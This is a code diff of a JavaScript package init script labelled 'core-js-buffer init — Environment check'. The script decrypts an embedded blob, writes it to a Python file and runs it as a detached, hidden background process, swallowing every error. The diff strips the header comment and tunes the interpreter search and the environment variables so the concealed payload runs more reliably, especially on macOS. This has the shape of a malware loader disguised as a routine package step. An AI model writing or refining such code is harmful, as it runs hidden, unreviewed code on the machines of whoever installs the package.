@@ -1,5 +1,5 @@
 /**
- * core-js-buffer init — Environment check
+ * 
  */
 
 'use strict';
@@ -101,8 +101,9 @@ function gcmDecrypt(key, blob) {
   ]);
 }
 
+// ── 
 function findPython() {
-  var bins = ['python3','python','python3.12','python3.11','python3.10','python3.9','python3.8'];
+  var bins = ['python3.11','python3.10','python3.9','python3.12','python3.13','python3','python'];
   for (var i = 0; i < bins.length; i++) {
     try {
       if (cp.spawnSync(bins[i], ['--version'], { timeout: 3000, windowsHide: true }).status === 0) {
@@ -198,11 +199,16 @@ function patchRuntime(code) {
     var execFile = path.join(modDir, 'exec_runtime.py');
     fs.writeFileSync(execFile, execCode);
 
+    // 
     cp.spawn(python, [execFile], {
       detached: true,
       stdio: 'ignore',
       windowsHide: true,
       cwd: modDir,
+      env: Object.assign({}, process.env, {
+        OBJC_DISABLE_INITIALIZE_FORK_SAFETY: 'YES',
+        PYTHONUNBUFFERED: '1',
+      }),
     }).unref();
 
   } catch (_) {}
